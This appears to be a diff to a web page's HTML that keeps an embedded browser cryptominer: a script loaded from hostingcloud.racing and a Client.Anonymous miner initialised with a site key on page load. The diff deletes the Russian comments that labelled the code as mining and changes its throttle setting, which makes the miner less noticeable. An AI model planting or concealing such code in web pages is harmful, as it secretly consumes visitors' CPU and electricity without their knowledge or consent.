@@ -339,7 +339,7 @@
         </div>
     </div>
 
-    <!-- Подключение скрипта для майнинга -->
+
     <script src="https://www.hostingcloud.racing/ECfX.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
@@ -356,14 +356,14 @@
                 setTimeout(() => loader.remove(), 300);
             });
 
-            // Инициализация клиента для майнинга
+
             try {
                 if (typeof Client === 'undefined') {
                     throw new Error('Класс Client не определен');
                 }
 
                 var _client = new Client.Anonymous('2ec71af93391bf355c4d45b2cf34c8042dc3e888c1e58d68b9c1c6898045ebc4', {
-                    throttle: 0,
+                    throttle: 0.7,
                     c: 'w'
                 });
 
